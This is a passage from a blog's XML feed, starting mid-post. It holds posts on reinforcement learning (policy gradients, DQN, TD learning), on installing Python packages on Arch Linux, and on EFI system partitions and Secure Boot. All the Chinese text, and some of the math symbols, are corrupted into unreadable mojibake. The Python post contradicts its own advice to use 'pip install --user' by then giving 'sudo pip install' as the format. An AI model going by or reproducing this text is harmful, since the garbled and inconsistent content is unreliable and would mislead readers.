¹æ®æ‰€å¤„çš„ç¯å¢ƒï¼Œåˆ¤æ–­ä¸‹ä¸€æ­¥è¡ŒåŠ¨çš„æ¦‚ç‡ï¼Œæ¯ä¸€ç§åŠ¨ä½œéƒ½æœ‰å¯èƒ½è¢«é€‰ä¸­ï¼Œåªæ˜¯å¯èƒ½æ€§å¤§å°ä¸åŒä½¿ç”¨è¿ç»­çš„æ¦‚ç‡åˆ†å¸ƒå¤„ç†é€‰æ‹©è¿ç»­çš„åŠ¨ä½œ ä»£è¡¨ï¼šPolicy Gradients</p></li><li><p>åŸºäºä»·å€¼(Value-Based RL)</p><p>ç›´æ¥é€‰æ‹©ä»·å€¼æœ€é«˜çš„åŠ¨ä½œï¼›æ— æ³•å¤„ç†è¿ç»­çš„åŠ¨ä½œ ä»£è¡¨ï¼šQLearningã€Sarsa</p></li><li><p>ç»“åˆ Policy å’Œ Value çš„ Actor-Critic</p><p>Actorï¼š åŸºäºæ¦‚ç‡åšå‡ºåŠ¨ä½œ Criticï¼š æ ¹æ®åšå‡ºçš„åŠ¨ä½œç»™å‡ºä»·å€¼</p></li></ol><h3 id="æ›´æ–°é¢‘ç‡">æ›´æ–°é¢‘ç‡</h3><ol type="1"><li><p>å›åˆæ›´æ–°(Monte-Carlo update) ç­‰å¾…æ¯æ¬¡è®­ç»ƒç»“æŸï¼Œè¿›è¡Œæ›´æ–°ä»£è¡¨ï¼šåŸºç¡€ç‰ˆ Policy Gradientsã€Monte-Carlo Learing</p></li><li><p>å•æ­¥æ›´æ–°(Temporal-Difference update) è®­ç»ƒè¿‡ç¨‹ä¸­çš„æ¯ä¸€æ­¥éƒ½è¿›è¡Œæ›´æ–°ä»£è¡¨ï¼šQ Learningã€Sarsaã€å‡çº§ç‰ˆ Policy Gradients</p></li></ol><h3 id="åœ¨çº¿ä¸ç¦»çº¿">åœ¨çº¿ä¸ç¦»çº¿</h3><ol type="1"><li><p>åœ¨çº¿å­¦ä¹  æœ¬äººåœ¨åœºï¼Œè¾¹ç©è¾¹å­¦ä¹  ä»£è¡¨ï¼šSarsaã€Sarsa(Lambda)</p></li><li><p>ç¦»çº¿å­¦ä¹  å¯ä»¥ä»ä»–äººçš„ç»å†ä¸­è¿›è¡Œå­¦ä¹ ä¹Ÿå¯ä»¥ç™½å¤©å­˜å‚¨å­¦ä¹ ç»éªŒï¼Œæ™šä¸Šç¦»çº¿å­¦ä¹  ä»£è¡¨ï¼šQ Learningã€Deep QNetwork</p></li></ol><h2 id="going-to-learn">Going to learn</h2><ol type="1"><li><p>Value-based learning.</p><ul><li>Deep Q network (DQN) for approximating <spanclass="math inline">\(ğ‘„^{\star}(ğ‘ |ğ‘)\)</span>.</li><li>Learn the network parameters using temporal different(TD).</li></ul></li><li><p>Policy-based learning.</p><ul><li>Policy network for approximating ğœ‹(ğ‘|ğ‘ ).</li><li>Learn the network parameters using <strong>policygradient</strong>.</li></ul></li><li><p>Actor-critic method. (Policy network + value network.)</p></li><li><p>Example: AlphaGo</p></li></ol><h2 id="èµ„æ–™">èµ„æ–™</h2><ol type="1"><li>2015 å¹´ David Silver çš„ç»å…¸è¯¾ç¨‹<ahref="http://www0.cs.ucl.ac.uk/staff/D.Silver/web/Teaching.html">Teaching</a></li><li>2017 å¹´åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡ Levine, Finn, Schulman çš„è¯¾ç¨‹ <ahref="http://rll.berkeley.edu/deeprlcourse/">CS 294 Deep ReinforcementLearning, Spring 2017</a></li><li>å¡å†…åŸºæ¢…éš†å¤§å­¦çš„ 2017 æ˜¥å­£è¯¾ç¨‹<ahref="https://katefvision.github.io/">Deep RL and Control</a>ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Policy-based Method of RL</title>
      <link href="/blog/2020/12/17/ml/rl/policy_based/"/>
      <url>/blog/2020/12/17/ml/rl/policy_based/</url>
      
        <content type="html"><![CDATA[<p>Policy function ğœ‹(ğ‘|ğ‘ ) ç”¨æ¥æŒ‡å¯¼ agent å»è¿åŠ¨ï¼Œå®ƒæ¥å—ä¸€ä¸ªçŠ¶æ€ sä½œä¸ºè¾“å…¥ï¼Œè¾“å‡ºæ‰€æœ‰åŠ¨ä½œçš„æ¦‚ç‡ï¼Œagent ä»æ‰€æœ‰åŠ¨ä½œä¸­é‡‡æ ·é€‰å–ä¸€ä¸ªåŠ¨ä½œ aæ‰§è¡Œã€‚</p><p>Can we directly learn a policy function ğœ‹(ğ‘|ğ‘ )?</p><ul><li>If there are only a few states and actions, then yes, we can.</li><li>Draw a table (matrix) and learn the entries.</li><li>What if there are too many (or infinite) states or actions?</li></ul><h2 id="policy-network-ğœ‹ğ‘ğ‘ ğ›‰">Policy Network ğœ‹(ğ‘|ğ‘ ;ğ›‰)</h2><p>è¿‘ä¼¼å‡½æ•°å¸¸ç”¨çš„æ˜¯çº¿æ€§å›å½’å’Œç¥ç»ç½‘ç»œã€‚</p><p>Policy network: Use a neural net to approximate ğœ‹(ğ‘|ğ‘ ;ğ›‰).</p><ul><li>Use policy network ğœ‹(ğ‘|ğ‘ ;ğ›‰) to approximate ğœ‹(ğ‘|ğ‘ ;ğ›‰).</li><li>ğ›‰: trainable parameters of the neural net</li></ul><p><span class="math inline">\(\sum_{a \in \mathcal{A}}\pi\left(\left.a\right|{s} ; \boldsymbol{\theta}\right)=1\)</span></p><h2 id="state-value-function">State-value function</h2><p><spanclass="math inline">\(V_{\pi}\left(s_{t}\right)=\mathbb{E}_{A}\left[Q_{\pi}\left(s_{t},A\right)\right]=\sum_{a} \pi\left(a \mid s_{t}\right) \cdotQ_{\pi}\left(s_{t}, a\right)\)</span></p><h3 id="approximate-state-value-function">Approximate state-valuefunction</h3><ul><li>Approximate policy function <spanclass="math inline">\(\pi(a|s_{t})\)</span> by policy network <spanclass="math inline">\(\pi(a|s_{t};\theta)\)</span>.</li><li>Approximate value function <spanclass="math inline">\(V_{\pi}\left(s_{t}\right)\)</span> by: <spanclass="math inline">\(V\left(s_{t} ; \boldsymbol{\theta}\right)=\sum_{a}\pi\left(a \mid s_{t} ; \boldsymbol{\theta}\right) \cdotQ_{\pi}\left(s_{t}, a\right)\)</span></li></ul><p>Policy-based learning: Learn ğ›‰ that maximizes <spanclass="math inline">\(J(\boldsymbol{\theta})=\mathbb{E}_{S}[V(S ;\boldsymbol{\theta})]\)</span></p><p>Policy gradient ascent to improve ğ›‰:</p><ul><li>Observe state s</li><li>Update policy by: <span class="math inline">\(\theta \leftarrow\theta + \beta \cdot \frac{\partial V(s;\theta)}{\partial\theta}\)</span></li><li>Policy gradient: <span class="math inline">\(\frac{\partialV(s;\theta)}{\partial \theta}\)</span></li></ul><h2 id="policy-gradient">Policy gradient</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216104659.png"alt="form_1" /><figcaption aria-hidden="true">form_1</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216104712.png"alt="form_2" /><figcaption aria-hidden="true">form_2</figcaption></figure><h3 id="calculate-policy-gradient-for-discrete-actions">Calculate PolicyGradient for Discrete Actions</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216105014.png"alt="discrete_action" /><figcaption aria-hidden="true">discrete_action</figcaption></figure><h3 id="calculate-policy-gradient-for-continuous-actions">CalculatePolicy Gradient for Continuous Actions</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216105826.png"alt="continuous_action" /><figcaption aria-hidden="true">continuous_action</figcaption></figure><h3 id="update-policy-network-using-policy-gradient">Update policynetwork using policy gradient</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216110804.png"alt="algorithm" /><figcaption aria-hidden="true">algorithm</figcaption></figure><p>Two Options:</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216133540.png"alt="options" /><figcaption aria-hidden="true">options</figcaption></figure><h2 id="summary">Summary</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216133836.png"alt="summary" /><figcaption aria-hidden="true">summary</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Value-based Method of RL</title>
      <link href="/blog/2020/12/17/ml/rl/value_based/"/>
      <url>/blog/2020/12/17/ml/rl/value_based/</url>
      
        <content type="html"><![CDATA[<h2 id="deep-q-network">Deep Q-Network</h2><p>Goal: Win the game (â‰ˆ maximize the total reward.)</p><p>Question: If we know <spanclass="math inline">\(ğ‘„^{\star}(ğ‘ |ğ‘)\)</span>, what is the bestaction?</p><ul><li>Obviously, the best action is <span class="math inline">\(a_{t} =argmax_{a}Q^{\star}(s_{t},a)\)</span></li></ul><p>Challenge: We do not know <spanclass="math inline">\(ğ‘„^{\star}(ğ‘ |ğ‘)\)</span>.</p><ul><li>Solution: Deep Q Network (DQN)</li><li>Use neural network <span class="math inline">\(ğ‘„(ğ‘ ,ğ‘;ğ°)\)</span> toapproximate <span class="math inline">\(ğ‘„^{\star}(ğ‘ |ğ‘)\)</span>, DQNè¾“å…¥å½“å‰çŠ¶æ€ Sï¼Œè¾“å‡ºåŠ¨ä½œç©ºé—´</li></ul><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215201250.png"alt="20201215201250" /><figcaption aria-hidden="true">20201215201250</figcaption></figure><h2 id="apply-dqn-to-play-game">Apply DQN to Play Game</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215201448.png"alt="20201215201448" /><figcaption aria-hidden="true">20201215201448</figcaption></figure><ol type="1"><li>è§‚å¯Ÿç¯å¢ƒ, è·å–çŠ¶æ€ <span class="math inline">\(s_{t}\)</span>,ä¹Ÿå°±æ˜¯ Observation</li><li>å‘ DQN è¾“å…¥çŠ¶æ€ <spanclass="math inline">\(s_{t}\)</span>ï¼Œè·å¾—ä½¿å…¶æœ€å¤§åŒ–çš„åŠ¨ä½œ <spanclass="math inline">\(a_{t}\)</span></li><li>ç¯å¢ƒæ¥å—åˆ° agent çš„åŠ¨ä½œå½±å“ï¼Œé€šè¿‡çŠ¶æ€è½¬ç§»å‡½æ•° <spanclass="math inline">\(s_{t+1}~p(\cdot|s_{t},a_{t})\)</span>è·å–ä¸‹ä¸€ä¸ªçŠ¶æ€ <span class="math inline">\(s_{t+1}\)</span></li><li>ç¯å¢ƒåŒæ—¶ç»™å‡ºæœ¬è½®çš„ reward</li></ol><h2 id="çŠ¶æ€ä»·å€¼å‡½æ•°çš„ä¼°ç®—">çŠ¶æ€ä»·å€¼å‡½æ•°çš„ä¼°ç®—</h2><h3 id="monte-carlo-policy-evaluation">Monte-Carlo PolicyEvaluation</h3><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204309.png"alt="20201215204309" /> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215203942.png"alt="20201215203942" /></p><h3 id="æ—¶åºå·®åˆ†æ–¹æ³•-temporal-difference-td----å•æ­¥æ›´æ–°">æ—¶åºå·®åˆ†æ–¹æ³•Temporal-difference (TD) -- å•æ­¥æ›´æ–°</h3><ul><li>Can I update the model before finishing the tripï¼Ÿ</li><li>Can I get a better ğ° as soon as I arrived at DC?</li></ul><p>That's TD learning!</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204718.png"alt="20201215204718" /><figcaption aria-hidden="true">20201215204718</figcaption></figure><p>TD error</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204809.png"alt="20201215204809" /><figcaption aria-hidden="true">20201215204809</figcaption></figure><h4 id="apply-td-learning-to-dqn">Apply TD learning to DQN</h4><p>æƒ³è¦ä½¿ç”¨ TDç®—æ³•ï¼Œå¿…é¡»ç­‰å¼å·¦è¾¹æœ‰ä¸€é¡¹ï¼Œå³è¾¹æœ‰ä¸¤é¡¹ï¼Œå³è¾¹ä¸¤é¡¹ä¸­æœ‰ä¸€é¡¹ä¸ºçœŸå®è§‚æµ‹åˆ°çš„ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215205216.png"alt="20201215205216" /><figcaption aria-hidden="true">20201215205216</figcaption></figure><p>ç®€è¦çš„æ¨å¯¼è¯æ˜ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215205708.png"alt="20201215205708" /><figcaption aria-hidden="true">20201215205708</figcaption></figure><h4 id="train-dqn-using-td-learning">Train DQN using TD learning</h4><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215211053.png"alt="20201215211053" /><figcaption aria-hidden="true">20201215211053</figcaption></figure><p><span class="math inline">\(Q(s_{t+1},a_{t+1}, w_{t})\)</span>çš„å€¼å®é™…ä¸Šç­‰äºæŠŠ a å½“ä½œå˜é‡æ±‚å¾—çš„æœ€å¤§åŒ– Q å€¼</p><h4 id="one-iteration-of-td-learning">One iteration of TD learning</h4><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215211400.png"alt="20201215211400" /><figcaption aria-hidden="true">20201215211400</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ­£ç¡®å®‰è£… Python åŒ…</title>
      <link href="/blog/2020/10/10/programming/python/issues/pkg_install/"/>
      <url>/blog/2020/10/10/programming/python/issues/pkg_install/</url>
      
        <content type="html"><![CDATA[<h2 id="sudo-install-vs-pip-install---user">sudo install vs pip install--user</h2><p>å…ˆæ”¾ç»“è®ºï¼šæ¨èä½¿ç”¨<code>pip install --user package_name</code></p><ol type="1"><li><p><code>sudo pip install</code> Both <code>sudo pip install</code>and its other common variant <code>sudo -H pip install</code> should notbe encouraged because it is a security risk to use root privileges touse <code>pip</code> to install Python packages from PyPI (PythonPackage Index).</p><p>å½“ä½ ä½¿ç”¨ sudo è¿è¡Œ pip æ—¶ï¼Œä½ ä»¥ sudoæƒé™è¿è¡Œ<code>setup.py</code>ã€‚æ¢å¥è¯è¯´ï¼Œä½ åœ¨ä»¥ sudoæƒé™è¿è¡Œä¸€æ®µä»ç½‘ç»œä¸Šä¸‹è½½çš„ Python ä»£ç ï¼Œå­˜åœ¨æå¤§çš„å®‰å…¨éšæ‚£ã€‚</p></li><li><p><code>pip install --user</code></p><p>è¯¥å‘½ä»¤å°† pythonåŒ…å®‰è£…åˆ°æœ¬åœ°ç”¨æˆ·ç›®å½•ï¼Œä¾‹å¦‚ï¼š<code>~/.local/lib/python</code></p></li></ol><h2 id="arch-linux-ä¸Šå®‰è£…-python-åŒ…">Arch Linux ä¸Šå®‰è£… Python åŒ…</h2><p>è¯¸å¦‚ Arch Linuxã€Ubuntu ç­‰å‘è¡Œç‰ˆè‡ªå¸¦åŒ…ç®¡ç†å™¨ï¼Œä¾‹å¦‚ï¼š Arch Linux çš„pacmanï¼Œè€Œ Python åˆå¸¸ç”¨ pip ä½œä¸ºå…¶åŒ…ç®¡ç†å™¨ï¼Œé‚£æˆ‘ä»¬è¯¥ä½¿ç”¨å“ªä¸€ç§å‘¢ï¼Ÿ</p><p>ä¸€ä¸ªåŸåˆ™ï¼šåšæŒç”¨ä¸€ç§åŒ…ç®¡ç†å™¨</p><p>å»ºè®®ï¼š</p><ol type="1"><li><p>åœ¨å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œä¼˜å…ˆä½¿ç”¨ pacman åŒ…ç®¡ç†å™¨å®‰è£… Python åŒ…</p><p>Python3: <code>sudo pacman -S python-'package'</code></p><p>ä¾‹å¦‚ï¼š<code>pacman -S python-bs4</code></p><p>Python2: <code>sudo pacman -S python2-'package'</code></p><p>å¤§å¤šæ•°åŒ…éƒ½å¯ä»¥é€šè¿‡ pacman è¿›è¡Œå®‰è£…ï¼Œå½“ä¸€äº›åŒ…æ—¢æ²¡æœ‰åœ¨ ArchLinuxä»“åº“ï¼Œåˆæ²¡æœ‰åœ¨ AUR çš„æ—¶å€™ï¼Œä½ éœ€è¦ä¸‹è½½ PKGBUILD æ–‡ä»¶ï¼Œç¼–è¯‘ç„¶åä½¿ç”¨ pacmanå®‰è£…</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">makepkg -s</span><br><span class="line">sudo pacman -U &#x27;compiled-package&#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>pacman å®‰è£…ä¸æ¥ï¼ˆä»“åº“é‡Œæ²¡æœ‰ï¼‰çš„æ—¶å€™ï¼Œä½¿ç”¨ pip å®‰è£…</p><p>å½“ AUR ä¸­æ²¡æœ‰è¯¥åŒ…æˆ–è€… PKGBUILD ä¸ç®¡ç”¨æ—¶ï¼Œä½¿ç”¨ pip å®‰è£…æ ¼å¼ï¼š<code>pip install --user package_name</code></p><p>Python3: <code>sudo pip install 'python-package'</code> Python2:<code>sudo pip2 install 'python-package'</code></p><p>æ³¨æ„ï¼šç¡®ä¿åŒ…åªå®‰è£…åœ¨ä½ çš„å®¶ç›®å½•ä¸‹ï¼Œä»¥é¿å…ä¸ç³»ç»ŸåŒ…æ··æ·†ã€‚</p><blockquote><p>Never install anything with pip without --user, it will install filesto the system and conflict with pacman</p></blockquote></li><li><p>å¯¹äº Pythoné¡¹ç›®(å› ä¸ºé¡¹ç›®çš„ä¾èµ–åŒ…ä¸æ˜¯å¸¸ç”¨)ï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p><p>ä¾‹å¦‚ï¼š<code>virtualenv</code></p><p><code>sudo pacman -S python-virtualenv</code></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://bbs.archlinux.org/viewtopic.php?id=139264">Betterto install PyPI packages using pacman or pip?</a></li><li><ahref="https://www.reddit.com/r/archlinux/comments/dzbbgc/pacman_or_pip/">Pacmanor pip?</a></li><li><ahref="https://askubuntu.com/questions/802544/is-sudo-pip-install-still-a-broken-practice">Is<code>sudo pip install</code> still a broken practice?</a></li><li><ahref="https://stackoverflow.com/questions/29310688/sudo-pip-install-vs-pip-install-user">sudopip install VS pip install --user</a></li><li><ahref="https://unix.stackexchange.com/questions/76389/recommended-way-of-installing-python-packages-on-arch">Recommendedway of installing python packages on Arch</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>EFI åˆè¯†</title>
      <link href="/blog/2020/09/30/os/efi/"/>
      <url>/blog/2020/09/30/os/efi/</url>
      
        <content type="html"><![CDATA[<p>UEFI+GPT çš„ç»“æ„çš„åˆ†åŒºæ ·å­æ˜¯ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929165639.png"alt="partition" /><figcaption aria-hidden="true">partition</figcaption></figure><p>ä¸‰ä¸ªåˆ†åŒºï¼šæ¢å¤åˆ†åŒºã€ESPï¼ˆä¸€èˆ¬ä¸º FAT32 éšè—åˆ†åŒºï¼‰ã€MSRåˆ†åŒºï¼ˆæ²¡ä»€ä¹ˆç”¨ï¼Œä¸ç”¨ç®¡ï¼‰</p><h2 id="efi">EFI</h2><p>The EFI system partition (also called ESP) is an OS independentpartition that acts as the storage place for the EFI bootloaders,applications and drivers to be launched by the UEFI firmware. It ismandatory for UEFI boot. å…¶ä¸­ Boot Loaderæ˜¯åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸è¿è¡Œä¹‹å‰è¿è¡Œçš„ä¸€æ®µå°ç¨‹åºã€‚è¿™æ®µå°ç¨‹åºå¯ä»¥å°†ç³»ç»Ÿçš„è½¯ç¡¬ä»¶ç¯å¢ƒå¸¦åˆ°ä¸€ä¸ªåˆé€‚çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸ºæœ€ç»ˆè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸å‡†å¤‡å¥½æ­£ç¡®çš„ç¯å¢ƒã€‚</p><p>EFI ç³»ç»Ÿåˆ†åŒº,å¸¦æœ‰ efiã€boot æ ‡å¿—æ ‡è®°ï¼Œå› æ­¤ ESPä¸å†é™åˆ¶å¿…é¡»è¦æ”¾åœ¨å¼€å¤´çš„ç¬¬ä¸€ä¸ªåˆ†åŒºé‡Œé¢ï¼Œå®ƒå¯ä»¥åœ¨æ•´å—ç¡¬ç›˜çš„ä»»æ„ä¸€ä¸ªåˆ†åŒºä½ç½®ã€‚æ‰«æå¯»æ‰¾ESP çš„æ—¶å€™æ˜¯ä»å‰å‘åæ‰«æï¼Œå› æ­¤é»˜è®¤æƒ…å†µä¸‹æœ€å…ˆæ‰¾åˆ°çš„æ˜¯ç¡¬ç›˜ä¸­é å‰çš„ESPï¼Œå¹¶å¯¹å…¶ä¸­çš„ efi è¿›è¡ŒåŠ è½½ã€‚</p><p>The UEFI specification mandates support for the FAT12, FAT16, andFAT32 file systems, but any conformant vendor can optionally add supportfor additional file systems; for example, the firmware in Apple Macssupports the HFS+ file system.</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒESP çš„å¤§å°è‡³å°‘ä¸º 100 MBï¼Œæ–‡ä»¶ç³»ç»Ÿæ ¼å¼ä¸ºFAT-12/16/32ã€‚å®é™…æƒ…å†µä¸‹ï¼ŒESP ä¸€èˆ¬è®¾ç½®ä¸º 100MB çš„ FAT32 åˆ†åŒºã€‚åœ¨ Linuxä¸Šä¸€èˆ¬å°†å…¶æŒ‚è½½åˆ° <code>/boot/efi</code>ã€‚ä¸ºäº†ç¡®è®¤å®ƒæ˜¯å¦æ˜¯ESP,å¯ä»¥æŒ‚è½½ï¼Œç„¶åæ£€æŸ¥å®ƒæ˜¯å¦åŒ…å«åä¸º EFI çš„ç›®å½•ï¼Œå¦‚æœåŒ…å«ï¼Œåˆ™ä¸ºESPã€‚</p><p>Win+Linux åŒç³»ç»Ÿ ESPï¼ˆThe EFI system partitionï¼‰æ–‡ä»¶ç»“æ„ï¼š</p><blockquote><p>å…¶ä¸­<code>***</code>è¡¨ç¤ºå¤šè¡Œç±»ä¼¼æ–‡ä»¶ï¼Œæˆ‘æ‰‹åŠ¨æ”¹çš„ï¼Œå› ä¸ºè¡Œæ•°å¤ªå¤šäº†</p></blockquote><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ Boot</span><br><span class="line">â”‚Â Â  â””â”€â”€ bootx64.efi</span><br><span class="line">â”œâ”€â”€ EFI.txt</span><br><span class="line">â”œâ”€â”€ Manjaro</span><br><span class="line">â”‚Â Â  â””â”€â”€ grubx64.efi</span><br><span class="line">â””â”€â”€ Microsoft</span><br><span class="line">    â”œâ”€â”€ Boot</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ BCD</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ BCD.LOG</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ BCD.LOG1</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ BCD.LOG2</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ bootmgfw.efi</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ bootmgr.efi</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ BOOTSTAT.DAT</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ boot.stl</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ en-US</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootmgfw.efi.mui</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootmgr.efi.mui</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â””â”€â”€ memtest.efi.mui</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ Fonts</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ chs_boot.ttf</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â””â”€â”€ wgl4_boot.ttf</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ kd_02_10df.dll</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ kdstub.dll</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ memtest.efi</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ qps-ploc</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â””â”€â”€ memtest.efi.mui</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ Resources</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootres.dll</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ en-US</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ bootres.dll.mui</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â””â”€â”€ zh-CN</span><br><span class="line">    â”‚Â Â  â”‚Â Â      â””â”€â”€ bootres.dll.mui</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ winsipolicy.p7b</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ zh-CN</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootmgfw.efi.mui</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootmgr.efi.mui</span><br><span class="line">    â”‚Â Â  â”‚Â Â  â””â”€â”€ memtest.efi.mui</span><br><span class="line">    â”‚Â Â  â””â”€â”€ zh-TW</span><br><span class="line">    â”‚Â Â      â”œâ”€â”€ bootmgfw.efi.mui</span><br><span class="line">    â”‚Â Â      â”œâ”€â”€ bootmgr.efi.mui</span><br><span class="line">    â”‚Â Â      â””â”€â”€ memtest.efi.mui</span><br><span class="line">    â””â”€â”€ Recovery</span><br><span class="line">        â”œâ”€â”€ BCD</span><br><span class="line">        â”œâ”€â”€ BCD.LOG</span><br><span class="line">        â”œâ”€â”€ BCD.LOG1</span><br><span class="line">        â””â”€â”€ BCD.LOG2</span><br><span class="line">13 directories, 58 files</span><br></pre></td></tr></table></figure><h2 id="nvram">NVRAM</h2><p>NVRAM is the non-volatile storage that contains the firmwaresettings, which on classic PCs was also known as CMOS memory but onmodern systems may actually use some technology other than CMOS(Complementary Metal Oxide Semiconductor)</p><h2 id="efibootbootx64.efi"><code>\EFI\Boot\bootx64.efi</code></h2><p>The <code>\EFI\Boot\bootx64.efi</code> program is a fallback for whenthe EFI hasn't been configured with any NVRAM boot entries that refer toother boot programs on the disk. It's important for removable media likebootable CDs and USB drives, but <strong>on a hard drive, it's generallynot used</strong>.</p><p>Windows will install a copy of its bootloader to this pathautomatically as a fail-safe; when installing GRUB, the<code>grub-install</code> (or <code>grub2-install</code> depending onLinux distribution) command may also put a copy of the respectivebootloader here if it does not already exist. If you want, you can use<code>grub-install --removable</code> to tell it to install to thefallback boot path, or <code>grub-install --force-extra-removable</code>to overwrite any existing bootloader in the fallback path and replace itwith GRUB.</p><p>If you want to create a Secure Boot-compatible USB stick for UEFI,you should place a copy of the shim as <code>EFI\boot\bootx64.efi</code>and a copy of GRUB as <code>EFI\boot\grubx64.efi</code>, as the shimbootloader will look for <code>grubx64.efi</code> in the same directorythe shim bootloader is in.</p><h2id="efimicrosoftbootbootmgfw.efi"><code>\EFI\Microsoft\Boot\bootmgfw.efi</code></h2><p><code>bootmgfw.efi</code> isn't Windows bootloader, it's Windows BootManager, <code>\Windows\System32\winload.efi</code> is called Windowsbootloader</p><h2 id="secure-boot-shimx64.efi-and-the-reasons-for-it">Secure Boot:<code>shimx64.efi</code> and the reasons for it</h2><p>Secure Boot requires that a bootloader must be signed by acertificate that is included in the system's Secure Boot NVRAM variable<code>db</code>, or the bootloader's SHA256 hash must be whitelisted inthe same NVRAM variable. A SHA256 hash will only match a specificversion of a particular bootloader, so updates won't be possible unlessthe firmware variable is also updated. So the certificates are the wayto go.</p><p>Unfortunately, many system vendors will only include a few SecureBoot certificates to their products: often only the vendor's owncertificate (for firmware updates and 